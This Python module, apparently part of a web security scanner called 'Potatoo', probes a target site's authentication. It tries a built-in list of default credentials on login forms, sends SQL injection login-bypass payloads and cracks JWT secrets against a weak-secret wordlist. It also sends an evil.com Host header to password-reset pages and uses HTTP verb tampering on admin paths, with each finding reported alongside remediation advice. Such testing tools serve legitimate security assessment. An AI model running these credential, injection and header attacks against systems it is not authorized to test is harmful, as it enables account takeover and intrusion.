"""
Potatoo — Authentication Weakness Tester
JWT analysis, default credentials, session security, brute-force protection, password reset
"""

import re
import json
import base64
import urllib.parse
from typing import List, Dict, Optional


# ─── Default Credentials ───────────────────────────────────────────────────────
DEFAULT_CREDENTIALS = [
    ("admin",     "admin"),
    ("admin",     "password"),
    ("admin",     "123456"),
    ("admin",     "admin123"),
    ("admin",     "password123"),
    ("admin",     ""),
    ("root",      "root"),
    ("root",      "toor"),
    ("root",      "password"),
    ("test",      "test"),
    ("guest",     "guest"),
    ("user",      "user"),
    ("admin",     "letmein"),
    ("administrator", "administrator"),
    ("admin",     "qwerty"),
    ("admin",     "1234"),
]

LOGIN_PATHS = [
    "/login", "/signin", "/admin/login", "/wp-login.php", "/user/login",
    "/auth/login", "/api/login", "/api/auth", "/api/v1/auth/login",
    "/admin", "/administrator", "/wp-admin",
]

JWT_NONE_HEADERS = [
    {"alg": "none", "typ": "JWT"},
    {"alg": "None", "typ": "JWT"},
    {"alg": "NONE", "typ": "JWT"},
    {"alg": "nOnE", "typ": "JWT"},
]

WEAK_JWT_SECRETS = [
    "secret", "password", "123456", "qwerty", "admin",
    "jwt_secret", "my-secret", "changeme", "letmein",
    "supersecret", "secretkey", "jwttoken", "default",
]


class AuthTester:
    def __init__(self, target_url, rate_limiter, logger, reporter, session):
        self.target_url = target_url.rstrip("/")
        self.rl         = rate_limiter
        self.log        = logger
        self.reporter   = reporter
        self.session    = session

    def run(self, cookies: List[Dict] = None, forms: List[Dict] = None) -> None:
        self.log.module_start("Authentication Testing")
        self._find_and_test_login_forms(forms or [])
        self._test_jwt_in_cookies(cookies or [])
        self._check_bruteforce_protection()
        self._test_password_reset()
        self._check_auth_bypass()
        self.log.module_done("Authentication Testing")

    # ─── Login Form Testing ────────────────────────────────────────────────────
    def _find_and_test_login_forms(self, forms: List[Dict]):
        self.log.info("Looking for login forms…")
        login_forms = []

        # Find login forms in crawled forms
        for form in forms:
            inputs = form.get("inputs", [])
            has_password = any(i.get("type") == "password" for i in inputs)
            if has_password:
                login_forms.append(form)

        # Also check common login paths
        for path in LOGIN_PATHS:
            url = self.target_url + path
            try:
                self.rl.wait(url)
                resp = self.session.get(url, timeout=8)
                self.rl.notify_response(url, resp.status_code)
                if resp.status_code == 200 and "password" in resp.text.lower():
                    # Parse forms on login page
                    form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE)
                    for fm in form_pattern.finditer(resp.text):
                        form_html = fm.group(0)
                        if "password" in form_html.lower():
                            action_m = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                            action   = urllib.parse.urljoin(url, action_m.group(1)) if action_m else url
                            inputs   = []
                            for inp in re.finditer(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*type=["\']([^"\']*)["\']', form_html, re.IGNORECASE):
                                inputs.append({"name": inp.group(1), "type": inp.group(2)})
                            for inp in re.finditer(r'<input[^>]*type=["\']([^"\']*)["\'][^>]*name=["\']([^"\']*)["\']', form_html, re.IGNORECASE):
                                inputs.append({"name": inp.group(2), "type": inp.group(1)})
                            login_forms.append({"action": action, "method": "POST", "inputs": inputs, "page": url})
            except Exception:
                pass

        self.log.info(f"Found {len(login_forms)} login form(s)")

        for form in login_forms[:3]:  # Test up to 3 login forms
            self._test_default_creds(form)
            self._test_sql_auth_bypass(form)

    def _test_default_creds(self, form: Dict):
        action = form.get("action", self.target_url)
        inputs = form.get("inputs", [])

        user_field = None
        pass_field = None
        for inp in inputs:
            t = inp.get("type", "text").lower()
            n = inp.get("name", "").lower()
            if t == "password" or "pass" in n:
                pass_field = inp["name"]
            elif t in ("text", "email") or any(k in n for k in ("user", "email", "login", "name")):
                user_field = inp["name"]

        if not user_field or not pass_field:
            return

        self.log.info(f"Testing {len(DEFAULT_CREDENTIALS)} default credential pairs on {action}…")

        # Get baseline (failed login) response length
        try:
            self.rl.wait(action)
            baseline = self.session.post(action, data={user_field: "nonexistent_user_xyz", pass_field: "wrongpass_xyz"}, timeout=10)
            baseline_len = len(baseline.text)
            baseline_url = baseline.url
        except Exception:
            return

        for username, password in DEFAULT_CREDENTIALS:
            data = {i["name"]: "" for i in inputs if i.get("name")}
            data[user_field] = username
            data[pass_field] = password

            try:
                self.rl.wait(action)
                resp = self.session.post(action, data=data, timeout=10, allow_redirects=True)
                self.rl.notify_response(action, resp.status_code)

                # Success indicators
                success_patterns = [
                    r"dashboard", r"logout", r"welcome", r"profile", r"account",
                    r"sign out", r"signout", r"log out",
                ]
                fail_patterns = [
                    r"invalid", r"incorrect", r"wrong", r"failed", r"error",
                    r"try again", r"denied",
                ]

                resp_lower = resp.text.lower()
                has_success = any(re.search(p, resp_lower) for p in success_patterns)
                has_fail    = any(re.search(p, resp_lower) for p in fail_patterns)
                redirected  = resp.url != baseline_url
                len_changed = abs(len(resp.text) - baseline_len) > 500

                if (has_success and not has_fail) or (redirected and len_changed):
                    self.reporter.add_finding(
                        title=f"Default Credentials Work: {username}/{password}",
                        severity="CRITICAL",
                        url=action,
                        description=f"Default credentials '{username}:{password}' successfully authenticated.",
                        evidence=f"Username: {username}\nPassword: {password}\nRedirected to: {resp.url}",
                        remediation="Change all default credentials immediately. Enforce strong password policy.",
                        module="auth",
                        cvss=9.8,
                    )
                    self.log.finding("CRITICAL", f"Default creds work: {username}/{password}", action)
                    return
            except Exception as e:
                self.log.debug(f"Credential test error: {e}")

    def _test_sql_auth_bypass(self, form: Dict):
        """Test SQL injection in authentication."""
        action = form.get("action", self.target_url)
        inputs = form.get("inputs", [])
        bypass_payloads = [
            ("' OR '1'='1'--", "anything"),
            ("admin'--",        "anything"),
            ("' OR 1=1--",      "anything"),
            ("admin' #",        "anything"),
        ]

        user_field = None
        pass_field = None
        for inp in inputs:
            t = inp.get("type", "text").lower()
            n = inp.get("name", "").lower()
            if t == "password":
                pass_field = inp["name"]
            elif t in ("text", "email") or "user" in n or "email" in n:
                user_field = inp["name"]

        if not user_field or not pass_field:
            return

        for u_payload, p_payload in bypass_payloads:
            data = {i["name"]: "test" for i in inputs if i.get("name")}
            data[user_field] = u_payload
            data[pass_field] = p_payload
            try:
                self.rl.wait(action)
                resp = self.session.post(action, data=data, timeout=10)
                self.rl.notify_response(action, resp.status_code)
                success = any(re.search(p, resp.text.lower()) for p in ["dashboard", "logout", "welcome", "profile"])
                if success:
                    self.reporter.add_finding(
                        title="SQL Injection Authentication Bypass",
                        severity="CRITICAL",
                        url=action,
                        description=f"Authentication can be bypassed using SQL injection in the username field.",
                        evidence=f"Payload: {u_payload}",
                        remediation="Use parameterized queries for authentication. Implement prepared statements.",
                        module="auth",
                        cvss=9.8,
                    )
                    self.log.finding("CRITICAL", "SQL Auth Bypass", action)
                    return
            except Exception:
                pass

    # ─── JWT Testing ───────────────────────────────────────────────────────────
    def _test_jwt_in_cookies(self, cookies: List[Dict]):
        self.log.info("Checking for JWT tokens…")
        # Also check response headers/cookies from target
        try:
            self.rl.wait(self.target_url)
            resp    = self.session.get(self.target_url, timeout=10)
            all_cookies = dict(resp.cookies)
            all_headers = dict(resp.headers)

            # Look for JWTs in cookies and headers
            candidates = list(all_cookies.values()) + list(all_headers.values())
            for value in candidates:
                self._analyze_jwt(str(value))
        except Exception:
            pass

    def _analyze_jwt(self, token: str):
        """Check if string is a JWT and analyze it."""
        parts = token.strip().split(".")
        if len(parts) != 3:
            return

        try:
            # Decode header
            header_b64 = parts[0] + "=="
            header     = json.loads(base64.b64decode(header_b64).decode("utf-8", errors="ignore"))
            alg        = header.get("alg", "").lower()

            if alg == "none":
                self.reporter.add_finding(
                    title="JWT 'none' Algorithm Accepted",
                    severity="CRITICAL",
                    url=self.target_url,
                    description="JWT uses 'none' algorithm — tokens can be forged without a signature.",
                    evidence=f"JWT header: {json.dumps(header)}",
                    remediation="Explicitly reject tokens with 'none' algorithm. Use RS256 or HS256.",
                    module="auth",
                    cvss=9.1,
                )
                self.log.finding("CRITICAL", "JWT 'none' algorithm", self.target_url)

            if alg == "hs256":
                # Try weak secrets
                try:
                    import hmac
                    import hashlib
                    header_payload = f"{parts[0]}.{parts[1]}"
                    for secret in WEAK_JWT_SECRETS:
                        sig = base64.urlsafe_b64encode(
                            hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()
                        ).rstrip(b"=").decode()
                        if sig == parts[2]:
                            self.reporter.add_finding(
                                title=f"JWT Signed with Weak Secret: '{secret}'",
                                severity="CRITICAL",
                                url=self.target_url,
                                description=f"JWT token is signed with a weak/guessable secret: '{secret}'",
                                evidence=f"Secret: {secret}\nAlgorithm: HS256",
                                remediation="Use a cryptographically random secret (min 256 bits). Rotate immediately.",
                                module="auth",
                                cvss=9.1,
                            )
                            self.log.finding("CRITICAL", f"Weak JWT secret: '{secret}'", self.target_url)
                            return
                except ImportError:
                    pass

            # Check payload for sensitive info
            try:
                payload_b64 = parts[1] + "=="
                payload     = json.loads(base64.b64decode(payload_b64).decode("utf-8", errors="ignore"))
                sensitive   = ["password", "secret", "key", "token", "ssn", "credit"]
                found_sens  = [k for k in payload if any(s in k.lower() for s in sensitive)]
                if found_sens:
                    self.reporter.add_finding(
                        title="Sensitive Data in JWT Payload",
                        severity="HIGH",
                        url=self.target_url,
                        description=f"JWT payload contains potentially sensitive fields: {found_sens}",
                        evidence=f"JWT payload fields: {list(payload.keys())}",
                        remediation="Never store sensitive data in JWT payload — it is base64-encoded, not encrypted.",
                        module="auth",
                        cvss=7.5,
                    )
            except Exception:
                pass

        except Exception as e:
            self.log.debug(f"JWT analysis error: {e}")

    # ─── Brute-Force Protection ────────────────────────────────────────────────
    def _check_bruteforce_protection(self):
        self.log.info("Checking brute-force protection…")
        for path in LOGIN_PATHS[:5]:
            url = self.target_url + path
            try:
                self.rl.wait(url)
                resp = self.session.get(url, timeout=8)
                if resp.status_code != 200:
                    continue

                if "password" not in resp.text.lower():
                    continue

                # Try 10 quick failed logins and check for lockout
                data = {"username": "admin", "password": "wrongpassword"}
                # Find form fields
                user_field = "username"
                pass_field  = "password"
                for fname in ["user", "email", "login", "username"]:
                    if fname in resp.text.lower():
                        user_field = fname
                        break

                locked = False
                for attempt in range(6):
                    self.rl.wait(url)
                    try:
                        r = self.session.post(url, data={user_field: "admin", pass_field: "wrongpass_test"}, timeout=8)
                        self.rl.notify_response(url, r.status_code)
                        if r.status_code == 429 or any(x in r.text.lower() for x in ["locked", "too many", "rate limit", "blocked"]):
                            locked = True
                            break
                    except Exception:
                        break

                if not locked:
                    self.reporter.add_finding(
                        title="No Brute-Force Protection on Login",
                        severity="MEDIUM",
                        url=url,
                        description="Login endpoint did not lock account or rate-limit after 6 failed attempts.",
                        evidence=f"Tested endpoint: {url}\nNo 429 or account lockout detected after 6 attempts.",
                        remediation="Implement account lockout after 5 failed attempts. Add rate limiting and CAPTCHA.",
                        module="auth",
                        cvss=6.5,
                    )
                    self.log.finding("MEDIUM", "No brute-force protection", url)
                break
            except Exception:
                pass

    # ─── Password Reset ────────────────────────────────────────────────────────
    def _test_password_reset(self):
        self.log.info("Testing password reset flow…")
        reset_paths = ["/forgot-password", "/reset-password", "/password-reset", "/account/forgot", "/auth/reset"]
        for path in reset_paths:
            url = self.target_url + path
            try:
                self.rl.wait(url)
                resp = self.session.get(url, timeout=8)
                if resp.status_code == 200:
                    # Check for host header injection in reset
                    self.rl.wait(url)
                    resp2 = self.session.post(
                        url,
                        data={"email": "victim@example.com"},
                        headers={"Host": "evil.com", "X-Forwarded-Host": "evil.com"},
                        timeout=8,
                    )
                    if resp2.status_code in (200, 302):
                        self.reporter.add_finding(
                            title="Password Reset — Potential Host Header Injection",
                            severity="HIGH",
                            url=url,
                            description="Password reset endpoint may be vulnerable to Host Header Injection — reset links could point to attacker-controlled domains.",
                            evidence=f"Sent Host: evil.com, X-Forwarded-Host: evil.com to reset endpoint.",
                            remediation="Validate Host header against a whitelist. Use absolute URLs configured server-side for reset emails.",
                            module="auth",
                            cvss=8.1,
                        )
                    break
            except Exception:
                pass

    # ─── Auth Bypass ───────────────────────────────────────────────────────────
    def _check_auth_bypass(self):
        self.log.info("Checking for auth bypass via HTTP verb tampering…")
        protected_paths = ["/admin", "/admin/", "/dashboard", "/api/admin", "/api/users"]
        for path in protected_paths:
            url = self.target_url + path
            try:
                self.rl.wait(url)
                base_resp = self.session.get(url, timeout=8)
                if base_resp.status_code not in (401, 403):
                    continue

                # Try verb tampering
                for method in ["HEAD", "POST", "PUT", "OPTIONS", "PATCH"]:
                    self.rl.wait(url)
                    resp = self.session.request(method, url, timeout=8)
                    if resp.status_code == 200:
                        self.reporter.add_finding(
                            title=f"HTTP Verb Tampering Auth Bypass ({method})",
                            severity="HIGH",
                            url=url,
                            description=f"GET returns 403 but {method} returns 200 — authentication bypass possible.",
                            evidence=f"GET → {base_resp.status_code}\n{method} → {resp.status_code}",
                            remediation="Apply authentication checks for all HTTP methods, not just GET/POST.",
                            module="auth",
                            cvss=8.1,
                        )
                        self.log.finding("HIGH", f"HTTP Verb Tampering bypass at {path}", url)
                        break
            except Exception:
                pass
